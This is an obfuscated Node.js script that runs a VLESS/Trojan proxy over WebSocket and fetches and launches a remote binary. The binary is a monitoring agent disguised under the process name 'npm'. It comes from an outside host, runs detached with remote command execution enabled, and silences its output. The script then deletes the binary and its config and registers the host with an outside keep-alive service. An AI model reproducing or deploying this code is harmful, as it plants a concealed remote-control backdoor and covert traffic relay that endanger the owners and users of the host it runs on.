const _0x40c746=_0x2b0d;function _0x4f5c(){const _0x2a04d1=['3858iyTXsM','utf8','asOrganization','write','get','1.1.1.1','https://amd64.ssss.nyc.mn/agent','message','application/dns-json','https://arm64.ssss.nyc.mn/v1','Failed\x20to\x20resolve\x20','find','Unknown','url','4679487GeliLY','hex','664270MlDevE','decode','DOMAIN','npm\x20is\x20already\x20running,\x20skip\x20running...','log',':443?security=tls&sni=','readUInt16BE','npm','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','length','join','connection','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','9e5a4b30-de7f-4aac-9675-e6609807f3c1','Hello\x20world!','listen','utf-8','4806683haUNxM','index.html','WSPATH','NEZHA_SERVER','concat','writeFileSync','Answer','buffer','Hug','NAME','zebra.565422.xyz','stream','toString','digest','http','catch','arm','unlink','Server\x20is\x20running\x20on\x20port\x20','writeHead','UUID','trojan://','\x20-p\x20','https://dns.google/resolve?name=','&path=%2F','pop','vless://','2083','2087','664192ZBrvVr','substr','NEZHA_KEY','&type=A','every','sha224','close','npm\x20running\x20error:','text/plain','https://speed.cloudflare.com/meta','replace','createServer','AUTO_ACCESS','readFile','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NEZHA_PORT','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','PORT','pipe','post','510LmjFQT','false','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','client_secret:\x20','chmod\x20+x\x20npm','Automatic\x20Access\x20Task\x20added\x20successfully','171acHxfk','\x20with\x20all\x20DNS\x20servers','type','Status','8443','send','env','connect','end','--tls','/bin/bash','error','aarch64','split','child_process','https://arm64.ssss.nyc.mn/agent','crypto','&fp=chrome&type=ws&host=','reduce','arm64','885672vprmoy','data','443','includes','text/html','finish','net','readUInt8','slice','update','2053','from','trim','then','config.yaml','https://amd64.ssss.nyc.mn/v1','49884mbQCPh','map','country'];_0x4f5c=function(){return _0x2a04d1;};return _0x4f5c();}(function(_0xd18f04,_0x537237){const _0x63c549=_0x2b0d,_0xb17377=_0xd18f04();while(!![]){try{const _0x5544db=parseInt(_0x63c549(0x1bc))/0x1+parseInt(_0x63c549(0x16b))/0x2+parseInt(_0x63c549(0x185))/0x3*(-parseInt(_0x63c549(0x1a9))/0x4)+-parseInt(_0x63c549(0x17f))/0x5*(-parseInt(_0x63c549(0x1ac))/0x6)+parseInt(_0x63c549(0x1cd))/0x7+-parseInt(_0x63c549(0x199))/0x8+-parseInt(_0x63c549(0x1ba))/0x9;if(_0x5544db===_0x537237)break;else _0xb17377['push'](_0xb17377['shift']());}catch(_0x284ffa){_0xb17377['push'](_0xb17377['shift']());}}}(_0x4f5c,0x63652));const os=require('os'),http=require(_0x40c746(0x15c)),fs=require('fs'),axios=require('axios'),net=require(_0x40c746(0x19f)),path=require('path'),crypto=require(_0x40c746(0x195)),{Buffer}=require(_0x40c746(0x1d4)),{exec,execSync}=require(_0x40c746(0x193)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x40c746(0x18b)][_0x40c746(0x162)]||_0x40c746(0x1c9),NEZHA_SERVER=process['env'][_0x40c746(0x1d0)]||'',NEZHA_PORT=process[_0x40c746(0x18b)][_0x40c746(0x17a)]||'',NEZHA_KEY=process['env'][_0x40c746(0x16d)]||'',DOMAIN=process['env'][_0x40c746(0x1be)]||_0x40c746(0x1d7),AUTO_ACCESS=process[_0x40c746(0x18b)][_0x40c746(0x177)]||!![],WSPATH=process['env'][_0x40c746(0x1cf)]||UUID[_0x40c746(0x1a1)](0x0,0x8),SUB_PATH=process[_0x40c746(0x18b)]['SUB_PATH']||'sub',NAME=process['env'][_0x40c746(0x1d6)]||_0x40c746(0x1d5),PORT=process[_0x40c746(0x18b)][_0x40c746(0x17c)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1fbdcb=_0x40c746;try{const _0x241dfe=await axios[_0x1fbdcb(0x1b0)](_0x1fbdcb(0x174)),_0x2a557f=_0x241dfe['data'];ISP=(_0x2a557f[_0x1fbdcb(0x1ab)]+'-'+_0x2a557f[_0x1fbdcb(0x1ae)])[_0x1fbdcb(0x175)](/ /g,'_');}catch(_0x35f607){ISP=_0x1fbdcb(0x1b8);}};GetISP();function _0x2b0d(_0x437734,_0x3df4a6){const _0x4f5cfd=_0x4f5c();return _0x2b0d=function(_0x2b0dcb,_0xc674e1){_0x2b0dcb=_0x2b0dcb-0x15a;let _0x4c140f=_0x4f5cfd[_0x2b0dcb];return _0x4c140f;},_0x2b0d(_0x437734,_0x3df4a6);}const httpServer=http[_0x40c746(0x176)]((_0x5833fb,_0x41fe68)=>{const _0x2f93e=_0x40c746;if(_0x5833fb['url']==='/'){const _0x33dc2e=path[_0x2f93e(0x1c6)](__dirname,_0x2f93e(0x1ce));fs[_0x2f93e(0x178)](_0x33dc2e,_0x2f93e(0x1ad),(_0x35994e,_0x2bed55)=>{const _0x2a7b=_0x2f93e;if(_0x35994e){_0x41fe68[_0x2a7b(0x161)](0xc8,{'Content-Type':'text/html'}),_0x41fe68[_0x2a7b(0x18d)](_0x2a7b(0x1ca));return;}_0x41fe68[_0x2a7b(0x161)](0xc8,{'Content-Type':_0x2a7b(0x19d)}),_0x41fe68[_0x2a7b(0x18d)](_0x2bed55);});return;}else{if(_0x5833fb[_0x2f93e(0x1b9)]==='/'+SUB_PATH){const _0x54ccbc=_0x2f93e(0x168)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x2f93e(0x196)+DOMAIN+_0x2f93e(0x166)+WSPATH+'#'+NAME+'-'+ISP,_0x49535b=_0x2f93e(0x163)+UUID+'@'+DOMAIN+_0x2f93e(0x1c1)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x32473c=_0x54ccbc+'\x0a'+_0x49535b,_0x4770a9=Buffer[_0x2f93e(0x1a4)](_0x32473c)['toString']('base64');_0x41fe68[_0x2f93e(0x161)](0xc8,{'Content-Type':_0x2f93e(0x173)}),_0x41fe68['end'](_0x4770a9+'\x0a');}else _0x41fe68[_0x2f93e(0x161)](0x194,{'Content-Type':_0x2f93e(0x173)}),_0x41fe68['end']('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x40c746(0x175)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x40c746(0x1b1)];function resolveHost(_0x21612b){return new Promise((_0x4d77f6,_0x264c81)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x21612b)){_0x4d77f6(_0x21612b);return;}let _0x2ae87e=0x0;function _0x50ee52(){const _0x98899e=_0x2b0d;if(_0x2ae87e>=DNS_SERVERS[_0x98899e(0x1c5)]){_0x264c81(new Error(_0x98899e(0x1b6)+_0x21612b+_0x98899e(0x186)));return;}const _0x106774=DNS_SERVERS[_0x2ae87e];_0x2ae87e++;const _0x207751=_0x98899e(0x165)+encodeURIComponent(_0x21612b)+_0x98899e(0x16e);axios['get'](_0x207751,{'timeout':0x1388,'headers':{'Accept':_0x98899e(0x1b4)}})[_0x98899e(0x1a6)](_0x43d3b3=>{const _0x44494a=_0x98899e,_0x541181=_0x43d3b3[_0x44494a(0x19a)];if(_0x541181[_0x44494a(0x188)]===0x0&&_0x541181[_0x44494a(0x1d3)]&&_0x541181[_0x44494a(0x1d3)]['length']>0x0){const _0x1855f1=_0x541181['Answer'][_0x44494a(0x1b7)](_0x1e02b9=>_0x1e02b9[_0x44494a(0x187)]===0x1);if(_0x1855f1){_0x4d77f6(_0x1855f1[_0x44494a(0x19a)]);return;}}_0x50ee52();})['catch'](_0x181d50=>{_0x50ee52();});}_0x50ee52();});}function handleVlessConnection(_0x3e2f6e,_0x363a8b){const _0x576a57=_0x40c746,[_0x35f9a1]=_0x363a8b,_0x182b37=_0x363a8b['slice'](0x1,0x11);if(!_0x182b37[_0x576a57(0x16f)]((_0x32f86f,_0x49b42d)=>_0x32f86f==parseInt(uuid[_0x576a57(0x16c)](_0x49b42d*0x2,0x2),0x10)))return![];let _0x29d0fe=_0x363a8b['slice'](0x11,0x12)[_0x576a57(0x1a0)]()+0x13;const _0x18c232=_0x363a8b[_0x576a57(0x1a1)](_0x29d0fe,_0x29d0fe+=0x2)['readUInt16BE'](0x0),_0x2aab6e=_0x363a8b[_0x576a57(0x1a1)](_0x29d0fe,_0x29d0fe+=0x1)[_0x576a57(0x1a0)](),_0x16d5ac=_0x2aab6e==0x1?_0x363a8b['slice'](_0x29d0fe,_0x29d0fe+=0x4)['join']('.'):_0x2aab6e==0x2?new TextDecoder()[_0x576a57(0x1bd)](_0x363a8b[_0x576a57(0x1a1)](_0x29d0fe+0x1,_0x29d0fe+=0x1+_0x363a8b[_0x576a57(0x1a1)](_0x29d0fe,_0x29d0fe+0x1)[_0x576a57(0x1a0)]())):_0x2aab6e==0x3?_0x363a8b[_0x576a57(0x1a1)](_0x29d0fe,_0x29d0fe+=0x10)[_0x576a57(0x197)]((_0x102b2a,_0x5b7c49,_0x4af2b2,_0x300347)=>_0x4af2b2%0x2?_0x102b2a[_0x576a57(0x1d1)](_0x300347[_0x576a57(0x1a1)](_0x4af2b2-0x1,_0x4af2b2+0x1)):_0x102b2a,[])['map'](_0x52cc6a=>_0x52cc6a['readUInt16BE'](0x0)[_0x576a57(0x15a)](0x10))[_0x576a57(0x1c6)](':'):'';_0x3e2f6e[_0x576a57(0x18a)](new Uint8Array([_0x35f9a1,0x0]));const _0x1185e8=createWebSocketStream(_0x3e2f6e);return resolveHost(_0x16d5ac)[_0x576a57(0x1a6)](_0x5b748c=>{const _0x1d3e38=_0x576a57;net['connect']({'host':_0x5b748c,'port':_0x18c232},function(){const _0x3694a3=_0x2b0d;this[_0x3694a3(0x1af)](_0x363a8b[_0x3694a3(0x1a1)](_0x29d0fe)),_0x1185e8['on']('error',()=>{})['pipe'](this)['on'](_0x3694a3(0x190),()=>{})[_0x3694a3(0x17d)](_0x1185e8);})['on'](_0x1d3e38(0x190),()=>{});})['catch'](_0x140ae0=>{const _0x4d8e5c=_0x576a57;net[_0x4d8e5c(0x18c)]({'host':_0x16d5ac,'port':_0x18c232},function(){const _0x2528d2=_0x4d8e5c;this[_0x2528d2(0x1af)](_0x363a8b[_0x2528d2(0x1a1)](_0x29d0fe)),_0x1185e8['on'](_0x2528d2(0x190),()=>{})['pipe'](this)['on'](_0x2528d2(0x190),()=>{})[_0x2528d2(0x17d)](_0x1185e8);})['on'](_0x4d8e5c(0x190),()=>{});}),!![];}function handleTrojanConnection(_0x144acc,_0x28edb9){const _0x4822bd=_0x40c746;try{if(_0x28edb9[_0x4822bd(0x1c5)]<0x3a)return![];const _0x364c4b=_0x28edb9[_0x4822bd(0x1a1)](0x0,0x38)[_0x4822bd(0x15a)](),_0x8e081b=[UUID];let _0x22131c=null;for(const _0x5a33e1 of _0x8e081b){const _0x3f219e=crypto['createHash'](_0x4822bd(0x170))[_0x4822bd(0x1a2)](_0x5a33e1)[_0x4822bd(0x15b)](_0x4822bd(0x1bb));if(_0x3f219e===_0x364c4b){_0x22131c=_0x5a33e1;break;}}if(!_0x22131c)return![];let _0x223cac=0x38;_0x28edb9[_0x223cac]===0xd&&_0x28edb9[_0x223cac+0x1]===0xa&&(_0x223cac+=0x2);const _0x380881=_0x28edb9[_0x223cac];if(_0x380881!==0x1)return![];_0x223cac+=0x1;const _0x2c85ed=_0x28edb9[_0x223cac];_0x223cac+=0x1;let _0xca6604,_0x2c0f4a;if(_0x2c85ed===0x1)_0xca6604=_0x28edb9[_0x4822bd(0x1a1)](_0x223cac,_0x223cac+0x4)[_0x4822bd(0x1c6)]('.'),_0x223cac+=0x4;else{if(_0x2c85ed===0x3){const _0x11b9f8=_0x28edb9[_0x223cac];_0x223cac+=0x1,_0xca6604=_0x28edb9[_0x4822bd(0x1a1)](_0x223cac,_0x223cac+_0x11b9f8)[_0x4822bd(0x15a)](),_0x223cac+=_0x11b9f8;}else{if(_0x2c85ed===0x4)_0xca6604=_0x28edb9['slice'](_0x223cac,_0x223cac+0x10)[_0x4822bd(0x197)]((_0x42f847,_0x11b182,_0x4fb86e,_0x5a20d7)=>_0x4fb86e%0x2?_0x42f847[_0x4822bd(0x1d1)](_0x5a20d7[_0x4822bd(0x1a1)](_0x4fb86e-0x1,_0x4fb86e+0x1)):_0x42f847,[])[_0x4822bd(0x1aa)](_0x37c6b2=>_0x37c6b2['readUInt16BE'](0x0)['toString'](0x10))[_0x4822bd(0x1c6)](':'),_0x223cac+=0x10;else return![];}}_0x2c0f4a=_0x28edb9[_0x4822bd(0x1c2)](_0x223cac),_0x223cac+=0x2;_0x223cac<_0x28edb9[_0x4822bd(0x1c5)]&&_0x28edb9[_0x223cac]===0xd&&_0x28edb9[_0x223cac+0x1]===0xa&&(_0x223cac+=0x2);const _0x5b98ac=createWebSocketStream(_0x144acc);return resolveHost(_0xca6604)['then'](_0x83f3e0=>{const _0x29470f=_0x4822bd;net[_0x29470f(0x18c)]({'host':_0x83f3e0,'port':_0x2c0f4a},function(){const _0x1afa26=_0x29470f;_0x223cac<_0x28edb9[_0x1afa26(0x1c5)]&&this[_0x1afa26(0x1af)](_0x28edb9[_0x1afa26(0x1a1)](_0x223cac)),_0x5b98ac['on'](_0x1afa26(0x190),()=>{})['pipe'](this)['on']('error',()=>{})[_0x1afa26(0x17d)](_0x5b98ac);})['on'](_0x29470f(0x190),()=>{});})[_0x4822bd(0x15d)](_0x501617=>{const _0x2dfccc=_0x4822bd;net[_0x2dfccc(0x18c)]({'host':_0xca6604,'port':_0x2c0f4a},function(){const _0x8fb4c5=_0x2dfccc;_0x223cac<_0x28edb9[_0x8fb4c5(0x1c5)]&&this[_0x8fb4c5(0x1af)](_0x28edb9[_0x8fb4c5(0x1a1)](_0x223cac)),_0x5b98ac['on'](_0x8fb4c5(0x190),()=>{})[_0x8fb4c5(0x17d)](this)['on']('error',()=>{})['pipe'](_0x5b98ac);})['on']('error',()=>{});}),!![];}catch(_0x112105){return![];}}wss['on'](_0x40c746(0x1c7),(_0x428050,_0x5290f8)=>{const _0x49432a=_0x40c746,_0x1d86ea=_0x5290f8[_0x49432a(0x1b9)]||'';_0x428050['once'](_0x49432a(0x1b3),_0x2a46b7=>{const _0x3d1cd8=_0x49432a;if(_0x2a46b7[_0x3d1cd8(0x1c5)]>0x11&&_0x2a46b7[0x0]===0x0){const _0x30f6a6=_0x2a46b7['slice'](0x1,0x11),_0x67a93e=_0x30f6a6['every']((_0x1707d9,_0x3d4944)=>_0x1707d9==parseInt(uuid[_0x3d1cd8(0x16c)](_0x3d4944*0x2,0x2),0x10));if(_0x67a93e){!handleVlessConnection(_0x428050,_0x2a46b7)&&_0x428050[_0x3d1cd8(0x171)]();return;}}!handleTrojanConnection(_0x428050,_0x2a46b7)&&_0x428050[_0x3d1cd8(0x171)]();})['on'](_0x49432a(0x190),()=>{});});const getDownloadUrl=()=>{const _0x1508dc=_0x40c746,_0x846c47=os['arch']();return _0x846c47===_0x1508dc(0x15e)||_0x846c47===_0x1508dc(0x198)||_0x846c47===_0x1508dc(0x191)?!NEZHA_PORT?_0x1508dc(0x1b5):_0x1508dc(0x194):!NEZHA_PORT?_0x1508dc(0x1a8):_0x1508dc(0x1b2);},downloadFile=async()=>{const _0x3f1112=_0x40c746;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2378b1=getDownloadUrl(),_0x32acc6=await axios({'method':'get','url':_0x2378b1,'responseType':_0x3f1112(0x1d8)}),_0x2e0974=fs['createWriteStream'](_0x3f1112(0x1c3));return _0x32acc6[_0x3f1112(0x19a)][_0x3f1112(0x17d)](_0x2e0974),new Promise((_0x36f872,_0x2d30f5)=>{const _0x4afd6d=_0x3f1112;_0x2e0974['on'](_0x4afd6d(0x19e),()=>{const _0x4d784d=_0x4afd6d;console[_0x4d784d(0x1c0)]('npm\x20download\x20successfully'),exec(_0x4d784d(0x183),_0x4e4083=>{if(_0x4e4083)_0x2d30f5(_0x4e4083);_0x36f872();});}),_0x2e0974['on'](_0x4afd6d(0x190),_0x2d30f5);});}catch(_0x545b71){throw _0x545b71;}},runnz=async()=>{const _0x246e44=_0x40c746;try{const _0x44867a=execSync(_0x246e44(0x17b),{'encoding':_0x246e44(0x1cc)});if(_0x44867a[_0x246e44(0x1a5)]()!==''){console[_0x246e44(0x1c0)](_0x246e44(0x1bf));return;}}catch(_0x2be05b){}await downloadFile();let _0x37ce95='',_0x190358=[_0x246e44(0x19b),_0x246e44(0x189),'2096',_0x246e44(0x16a),_0x246e44(0x169),_0x246e44(0x1a3)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x293506=_0x190358[_0x246e44(0x19c)](NEZHA_PORT)?_0x246e44(0x18e):'';_0x37ce95='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x246e44(0x164)+NEZHA_KEY+'\x20'+_0x293506+_0x246e44(0x179);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2c1db4=NEZHA_SERVER[_0x246e44(0x19c)](':')?NEZHA_SERVER[_0x246e44(0x192)](':')[_0x246e44(0x167)]():'',_0x335171=_0x190358['includes'](_0x2c1db4)?'true':_0x246e44(0x180),_0x14fc95=_0x246e44(0x182)+NEZHA_KEY+_0x246e44(0x1c8)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x335171+_0x246e44(0x181)+UUID;fs[_0x246e44(0x1d2)](_0x246e44(0x1a7),_0x14fc95);}_0x37ce95=_0x246e44(0x1c4);}else{console[_0x246e44(0x1c0)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x37ce95,{'shell':_0x246e44(0x18f)},_0x217a5b=>{const _0x1d8930=_0x246e44;if(_0x217a5b)console[_0x1d8930(0x190)](_0x1d8930(0x172),_0x217a5b);else console['log']('npm\x20is\x20running');});}catch(_0x1b155d){console[_0x246e44(0x190)]('error:\x20'+_0x1b155d);}};async function addAccessTask(){const _0x257eee=_0x40c746;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1b2edf='https://'+DOMAIN;try{const _0x265f4c=await axios[_0x257eee(0x17e)]('https://oooo.serv00.net/add-url',{'url':_0x1b2edf},{'headers':{'Content-Type':'application/json'}});console['log'](_0x257eee(0x184));}catch(_0x599cde){}}const delFiles=()=>{const _0x57e58a=_0x40c746;fs[_0x57e58a(0x15f)](_0x57e58a(0x1c3),()=>{}),fs[_0x57e58a(0x15f)](_0x57e58a(0x1a7),()=>{});};httpServer[_0x40c746(0x1cb)](PORT,()=>{const _0x545a99=_0x40c746;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x545a99(0x1c0)](_0x545a99(0x160)+PORT);});